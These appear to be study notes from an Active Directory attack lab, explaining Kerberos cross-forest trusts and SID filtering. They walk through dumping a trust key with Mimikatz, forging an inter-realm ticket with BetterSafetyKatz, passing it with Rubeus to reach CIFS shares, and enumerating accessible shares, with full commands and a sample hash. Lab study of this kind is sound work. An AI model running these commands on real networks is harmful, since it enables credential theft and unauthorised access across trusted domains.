Kerberos working across forest is same as working between two domains for example a client wants to access a service from dollarcorp.moneycorp.local to eurocorp.local, if there is external trust configured first the client will request for TGT from their own dc receive TGT, present the TGT and request for ST for service in another forest here the dc will see that the service resides in another forest via the SPN and present the client with inter realm TGT which is encrypted using trust key whose copy is present in both the DC(dollarcorp's and eurocorp's) the client will send the inter realm TGT to dc of eurpcorp and request to access a service then the dc of eurpcorp will provide him/her ST for that particular service and the client will present the ST to that service and gain access. Here if it was between two domains inside the same forest and if we have DA access on one domain we could extract the trust key and forge an inter realm TGT with sid history as enterprise administrator and gain access to dc or computers in another domain inside same forest as enterprise administrator but in case of across forest there exist a security mechanism called sid filtering which prevents from doing so but we can access only explicitly allowed resources like cifs, file service, database, etc. for example

- We extract trust key rc4_hmac_nt from [In] dollarcorp.moneycorp.local -> eurocorp.local
```
Invoke-Mimikatz-Command '"lsadump::trust /patch"'
```
- Forge inter realm tgt using bettersafetykatz
```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /rc4:2756bdf7dd8ba8e9c40fe60f654115a0 /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\trust_forest_tkt.kirbi" "exit" 
```
- Using rubeus we reqest ST for CIFS of eurocorp.local and present the ST to CIFS service
```
Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
```
- Now here we will not be able to access C$ although we have forged the TGT and we will only be allowed to access the resource with explicit permission example
```
ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```

# How do we find such explicitly allowed resources?
- Enumerate how many machines are there in eurocorp.local
- REquest ST for CIFS for every machine like above 
- Run net view against each machine and check if we can list shares ```net view \\eurocorp-dc.eurocorp.local\``` then ```dir \\eurocorp-dc.eurocorp.local\accessible-resource\``` then ```type \\eurocorp-dc.eurocorp.local\accessible-resource\flag.txt```